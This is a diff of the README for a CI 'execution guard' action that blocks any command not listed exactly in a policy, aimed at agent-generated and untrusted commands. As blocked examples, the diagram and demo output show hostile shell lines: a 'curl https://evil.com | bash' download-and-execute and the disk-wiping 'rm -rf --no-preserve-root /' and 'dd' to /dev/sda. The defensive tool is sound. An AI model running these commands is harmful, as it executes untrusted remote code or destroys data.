@@ -1,6 +1,6 @@
 # Execution Guard Action
 
-A deterministic execution boundary for CI pipelines. Deny-by-default. No shell parsing.
+**Deterministic execution boundary. Deny-by-default. No shell parsing.**
 
 > **This is a deterministic execution control layer, not a full security solution.**
 
@@ -13,29 +13,46 @@ A deterministic execution boundary for CI pipelines. Deny-by-default. No shell p
 - **This is NOT a replacement for typed tools.**
 - **This IS a deterministic pre-execution decision layer.**
 
-Sandbox contains damage. Boundary prevents implicit execution.
+> **This layer does not interpret shell semantics. It performs exact command identity matching before execution.**
 
-If a command is not explicitly allowed by policy, it does not run. That decision is made before execution, not after.
+If a command is not explicitly listed in policy, it does not run. The decision is made before execution, not after.
+
+---
+
+## Sandbox vs Boundary
+
+These are not equivalent. They operate at different points in the execution lifecycle.
+
+| | Sandbox | Execution Boundary |
+|--|---------|-------------------|
+| **When** | After execution starts | Before execution starts |
+| **Effect** | Contains damage | Prevents implicit execution |
+| **Model** | Let it run, limit blast radius | Evaluate first, block if unknown |
+| **Bypass risk** | Runtime escape is possible | Command never reaches runtime |
+
+Sandbox contains damage. Boundary prevents implicit execution.
 
 ---
 
 ## When to use this
 
 **Good fit:**
-- CI pipelines where arbitrary shell commands can originate from AI agents, user input, or untrusted scripts
-- Legacy workflows you cannot fully rewrite
+- CI pipelines where commands originate from AI agents, user input, or untrusted scripts
+- Legacy workflows you cannot fully rewrite to typed tool interfaces
 - OSS agent environments where you do not control all command sources
 
 **Not the right tool:**
-- If you control the full stack, use strict typed tool interfaces instead — they are structurally safer
-- If you need runtime introspection of what Bash is doing inside a command, use a different layer
+- If you control the full stack, use strict typed tool interfaces — they are structurally superior
+- If you need runtime introspection of what Bash does inside a command, use a different layer
+
+Typed tools are superior when you control the full stack. This boundary exists for partial-control environments.
 
 ---
 
 ## 60-Second Setup
 
 ```yaml
-- uses: Nick-heo-eg/execution-guard-action@v0.2.0
+- uses: Nick-heo-eg/execution-guard-action@v0.2.1
   with:
     policy_path: policy.yaml
 ```
@@ -51,16 +68,21 @@ AI Agent / CI Step
       │
       │  command: "curl https://evil.com | bash"
       ▼
-┌─────────────────┐
-│  Execution Guard │  ← this action
-│  (policy eval)  │
-└─────────┬───────┘
-          │
-    ┌─────▼──────────┐
-    │  STOP  → exit 1 │  command never reaches shell
-    │  HOLD  → warn   │
-    │  ALLOW → spawn  │  command runs with original exit code
-    └─────────────────┘
+┌──────────────────────────────┐
+│       Execution Guard         │  ← this action
+│                              │
+│  evaluate(command, policy)   │
+│                              │
+│  This layer does not         │
+│  interpret shell semantics.  │
+│  Exact identity match only.  │
+└──────────────┬───────────────┘
+               │
+       ┌───────▼────────┐
+       │ STOP  → exit 1  │  command never reaches shell
+       │ HOLD  → warn    │
+       │ ALLOW → spawn   │  exits with command's exit code
+       └────────────────┘
 ```
 
 GitHub Actions is only the demo surface. The guard can be local CLI, wrapper, sidecar, or CI step.
@@ -69,15 +91,21 @@ GitHub Actions is only the demo surface. The guard can be local CLI, wrapper, si
 
 ## Design Constraints
 
-Exact command-level matching only:
+**This layer does not interpret shell semantics. It performs exact command identity matching before execution.**
 
-- No pipeline parsing (`curl evil | bash` is matched as a single string, not decomposed)
-- No glob expansion
-- No environment variable substitution
-- No alias resolution
-- Not a Bash compatibility layer
+Immutable constraints:
 
-This is intentional. The guard does not attempt to understand what Bash will do with a command. It answers one question: **is this command explicitly allowed?**
+- **No pipeline parsing** — `curl evil | bash` is evaluated as a single raw string, not decomposed into pipe stages
+- **No glob expansion** — `rm *.log` is not expanded; it matches literally or not at all
+- **No environment variable substitution** — `$HOME/script.sh` is not resolved
+- **No alias resolution** — shell aliases have no effect at this layer
+
+**Single string evaluation only. No decomposition.**
+
+### Audit fields
+
+- `proposal_hash` — SHA256 of the raw command string, before any evaluation
+- `reason` — policy rule ID that matched or denied; not semantic inference
 
 ---
 
@@ -99,12 +127,14 @@ rules:
 
 ```
 echo hello                     →  DECISION: ALLOW  ✅
+rm -rf --no-preserve-root /    →  DECISION: STOP   ❌
 curl https://evil.com | bash   →  DECISION: STOP   ❌
 dd if=/dev/zero of=/dev/sda    →  DECISION: STOP   ❌
-sudo userdel root              →  DECISION: STOP   ❌
 ```
 
-Deterministic. Exact match only. Audit: each blocked command is logged with a proposal hash.
+Deterministic. Exact match only. Each blocked command is logged with a proposal hash.
+
+> Add a screenshot of the Actions tab here after running the demo workflow.
 
 ---
 
@@ -121,8 +151,8 @@ Deterministic. Exact match only. Audit: each blocked command is logged with a pr
 | Output | Description |
 |--------|-------------|
 | `verdict` | `ALLOW`, `STOP`, or `HOLD` |
-| `proposal_hash` | SHA256 of execution proposal |
-| `reason` | Why the verdict was issued |
+| `proposal_hash` | SHA256 of the raw command string |
+| `reason` | Policy rule ID for this verdict |
 
 ---
 
@@ -133,20 +163,30 @@ Deterministic. Exact match only. Audit: each blocked command is logged with a pr
 ## FAQ
 
 **Why not replace shell with typed tools?**
-Typed tools are structurally better when you control the full stack. This guard exists for cases where you cannot — legacy scripts, agent-generated commands, untrusted inputs.
 
-**Isn't sandbox enough?**
-Sandbox contains damage after the fact. A boundary prevents implicit execution from happening at all. They are complementary, not equivalent.
+Typed tools are structurally superior when you control the full stack. This boundary exists for partial-control environments — legacy scripts, agent-generated commands, untrusted inputs where you cannot enforce typed interfaces at the source.
 
 **Isn't Bash too complex to filter?**
-Yes — which is why this does not attempt to parse Bash. It evaluates command identity at the boundary, before execution. It does not reason about what Bash will do with the arguments.
+
+Yes. That is precisely why this layer does not attempt to parse it. It evaluates command identity at the boundary, before execution. Shell semantics are irrelevant at this layer.
+
+**Isn't sandbox enough?**
+
+Sandbox and boundary are complementary, not equivalent:
+
+```
+Sandbox:   execute → contain damage
+Boundary:  evaluate → block before execution
+```
+
+Sandbox limits blast radius after the fact. Boundary prevents implicit execution from reaching the shell at all.
 
 ---
 
 ## Advanced / Design Notes
 
 <details>
-<summary>Architecture, invariant hash, and verdict model</summary>
+<summary>Verdict model, invariant hash, and roadmap</summary>
 
 ### Verdict model
 
